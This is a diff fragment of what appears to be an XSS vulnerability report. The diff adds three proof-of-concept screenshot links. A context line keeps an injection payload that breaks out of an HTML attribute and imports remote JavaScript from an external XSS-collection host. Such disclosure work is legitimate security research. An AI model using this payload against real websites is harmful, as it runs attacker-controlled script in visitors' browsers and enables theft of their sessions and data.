@@ -29,7 +29,9 @@ Based on the DOM analysis, the following parameters are vulnerable and reflect t
 `"><img/src/onerror=import('//xss.report/c/cyberbro')>`
 
 # Proof of Concept
-
+<img width="1920" height="1041" alt="1" src="https://github.com/user-attachments/assets/32ae5a6f-f8b4-410c-b951-43756fce429b" />
+<img width="1920" height="1041" alt="2" src="https://github.com/user-attachments/assets/bdcd11ce-0adc-4777-9c13-6aee9c66da2a" />
+<img width="1920" height="1041" alt="3" src="https://github.com/user-attachments/assets/45e5efce-5f1d-4465-910e-2f12e8a39a90" />
 
 # Extracted DOM
 ```js
